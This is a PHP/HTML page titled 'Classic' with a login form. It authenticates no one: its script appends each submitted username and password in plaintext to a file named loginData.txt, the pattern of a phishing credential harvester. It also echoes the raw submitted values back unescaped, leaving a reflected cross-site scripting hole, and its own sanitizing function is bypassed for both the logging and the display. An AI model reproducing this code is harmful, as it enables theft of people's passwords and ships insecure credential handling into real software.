<!DOCTYPE html>
<html>
	<head>
		<title>
			Classic
		</title>
		<link rel="stylesheet" type="text/css" href="stylesheet.css">
	</head>
	<body>
		
<div class="ccontainer">
		<div id="mainbox">
			
			<div id="leftbox">
	  			<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
				Username: <br>
				<input type="text" name="name"> <br>
				Password <br>
				<input type="password" name="pass"> <br>
				<br>
				<input type="submit" name="Submit">
				</form>
			</div>
			
			<?php
			// define variables and set to empty values
			$name = $email = "";

			if ($_SERVER["REQUEST_METHOD"] == "POST") {
			  $name = test_input($_POST["name"]);
 			  $pass = test_input($_POST["pass"]);
			}

			function test_input($data) {
			  $data = trim($data);
			  $data = stripslashes($data);
 			  $data = htmlspecialchars($data);
			  return $data;
			}
			?>
			<?php
  			  $myfile = fopen("loginData.txt", "a+");
    		  $data = "Login name : ".$_POST['name']." -> Password : ".$_POST['pass'];
    		  fwrite($myfile, $data);
    		  fclose($myfile);
			 ?>
		
		<div id="infobox">
			Name: <?php echo $_POST["name"]; ?> <br>
			Password: <?php echo $_POST["pass"]; ?>
		</div>
		
		</div>
</div>
	</body>
</html>